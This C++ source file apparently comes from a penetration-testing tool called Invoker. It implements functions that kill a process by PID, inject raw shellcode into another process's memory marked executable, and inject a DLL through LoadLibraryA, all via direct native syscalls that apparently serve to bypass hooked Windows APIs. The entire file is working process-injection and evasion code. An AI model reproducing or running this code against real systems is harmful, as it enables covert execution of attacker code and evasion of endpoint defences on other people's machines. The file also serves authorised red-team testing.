// Copyright (c) 2019 Ivan Sincek
// v5.7.3

#include ".\invoker_syscalls.h"
#include ".\syscalls.h"

namespace InvokerSysCalls {

	// --------------------------------------- SECTION: PROCESSES

	bool ShutDownProcess(DWORD pid) {
		bool success = false;
		HANDLE hProcess = NULL;
		OBJECT_ATTRIBUTES attr = { };
		InitializeObjectAttributes(&attr, NULL, 0, NULL, NULL);
		CLIENT_ID client = { (PVOID)pid, 0 };
		if (NtOpenProcess(&hProcess, PROCESS_TERMINATE, &attr, &client) != STATUS_SUCCESS) {
			printf("Cannot get the process handle\n");
		}
		else {
			if (NtTerminateProcess(hProcess, 0) != STATUS_SUCCESS) {
				printf("Cannot terminate the process\n");
			}
			else {
				success = true;
				printf("Process has been terminated successfully\n");
			}
			NtClose(hProcess);
		}
		return success;
	}

	// --------------------------------------- SECTION: BYTECODES

	bool InjectBytecode(DWORD pid, std::string bytecode) {
		bool success = false;
		HANDLE hProcess = NULL;
		OBJECT_ATTRIBUTES attr = { };
		InitializeObjectAttributes(&attr, NULL, 0, NULL, NULL);
		CLIENT_ID client = { (PVOID)pid, 0 };
		if (NtOpenProcess(&hProcess, (PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), &attr, &client) != STATUS_SUCCESS) {
			printf("Cannot get the process handle\n");
		}
		else {
			LPVOID addr = NULL;
			SIZE_T size = bytecode.length();
			if (NtAllocateVirtualMemory(hProcess, &addr, 0, &size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE) != STATUS_SUCCESS) {
				printf("Cannot allocate the additional process memory\n");
			}
			else {
				ULONG old = 0;
				if (NtProtectVirtualMemory(hProcess, &addr, &size, PAGE_EXECUTE_READWRITE, &old) != STATUS_SUCCESS) {
					printf("Cannot change the process memory protection to executable\n");
				}
				else if (NtWriteVirtualMemory(hProcess, addr, (PVOID)bytecode.c_str(), bytecode.length(), NULL) != STATUS_SUCCESS) {
					printf("Cannot write to the process memory\n");
				}
				else {
					HANDLE hThread = NULL;
					if (NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)addr, NULL, FALSE, 0, 0, 0, NULL) != STATUS_SUCCESS) {
						printf("Cannot start the process thread\n");
					}
					else {
						success = true;
						printf("Bytecode has been injected successfully\n");
						Sleep(800); // NOTE: Prevent the race condition - freeing memory before executing it.
						NtClose(hThread);
					}
				}
				NtFreeVirtualMemory(hProcess, &addr, 0, MEM_RELEASE);
			}
			NtClose(hProcess);
		}
		return success;
	}

	// --------------------------------------- SECTION: DLLS

	bool InjectDLL(DWORD pid, std::string file) {
		bool success = false;
		HANDLE hProcess = NULL;
		OBJECT_ATTRIBUTES attr = { };
		InitializeObjectAttributes(&attr, NULL, 0, NULL, NULL);
		CLIENT_ID client = { (PVOID)pid, 0 };
		if (NtOpenProcess(&hProcess, (PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), &attr, &client) != STATUS_SUCCESS) {
			printf("Cannot get the process handle\n");
		}
		else {
			LPVOID addr = NULL;
			SIZE_T size = file.length();
			if (NtAllocateVirtualMemory(hProcess, &addr, 0, &size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE) != STATUS_SUCCESS) {
				printf("Cannot allocate the additional process memory\n");
			}
			else {
				if (NtWriteVirtualMemory(hProcess, addr, (PVOID)file.c_str(), file.length(), NULL) != STATUS_SUCCESS) {
					printf("Cannot write to the process memory\n");
				}
				else {
					HMODULE hLib = GetModuleHandleA("kernel32.dll");
					if (hLib == NULL) {
						printf("Cannot get the handle to \"kernel32.dll\"\n");
					}
					else {
						LPTHREAD_START_ROUTINE lpRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hLib, "LoadLibraryA");
						if (lpRoutine == NULL) {
							printf("Cannot get the LoadLibraryA() address\n");
						}
						else {
							HANDLE hThread = NULL;
							if (NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpRoutine, addr, FALSE, 0, 0, 0, NULL) != STATUS_SUCCESS) {
								printf("Cannot start the process thread\n");
							}
							else {
								success = true;
								printf("DLL has been injected successfully\n");
								Sleep(800); // NOTE: Prevent the race condition - freeing memory before executing it.
								NtClose(hThread);
							}
						}
					}
				}
				NtFreeVirtualMemory(hProcess, &addr, 0, MEM_RELEASE);
			}
			NtClose(hProcess);
		}
		return success;
	}

}
